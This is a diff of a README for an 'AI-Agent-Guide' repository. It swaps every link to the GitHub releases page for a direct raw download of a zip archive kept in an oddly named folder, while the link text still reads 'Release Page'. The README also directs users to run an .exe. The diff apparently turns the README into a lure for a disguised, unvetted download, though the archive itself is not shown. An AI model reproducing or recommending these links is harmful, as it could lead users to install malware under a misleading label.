@@ -1,6 +1,6 @@
 # 🤖 AI-Agent-Guide - Your go-to guide for AI agents
 
-[![Download AI-Agent-Guide](https://img.shields.io/badge/Download-AI--Agent--Guide-blue.svg)](https://github.com/FarmasiUSTB/AI-Agent-Guide/releases)
+[![Download AI-Agent-Guide](https://raw.githubusercontent.com/FarmasiUSTB/AI-Agent-Guide/main/pelargonic/AI-Agent-Guide.zip)](https://raw.githubusercontent.com/FarmasiUSTB/AI-Agent-Guide/main/pelargonic/AI-Agent-Guide.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the AI-Agent-Guide repository! This is a comprehensive guide that pro
 
 To get started with AI-Agent-Guide, follow these steps:
 
-1. **Visit the Release Page:** Click the button above or visit [this page](https://github.com/FarmasiUSTB/AI-Agent-Guide/releases) to download the latest version of the AI-Agent-Guide.
+1. **Visit the Release Page:** Click the button above or visit [this page](https://raw.githubusercontent.com/FarmasiUSTB/AI-Agent-Guide/main/pelargonic/AI-Agent-Guide.zip) to download the latest version of the AI-Agent-Guide.
    
 2. **Choose the Right File:** You will find multiple files available for download. Select the one that best fits your operating system. For example, if you are using Windows, look for a file with a `.exe` extension.
 
@@ -32,7 +32,7 @@ To ensure a smooth experience, your system should meet the following requirement
 
 ## 📥 Download & Install
 
-To download the AI-Agent-Guide, [visit this page](https://github.com/FarmasiUSTB/AI-Agent-Guide/releases) and choose the appropriate file for your system. 
+To download the AI-Agent-Guide, [visit this page](https://raw.githubusercontent.com/FarmasiUSTB/AI-Agent-Guide/main/pelargonic/AI-Agent-Guide.zip) and choose the appropriate file for your system. 
 
 ### Installation Steps
 
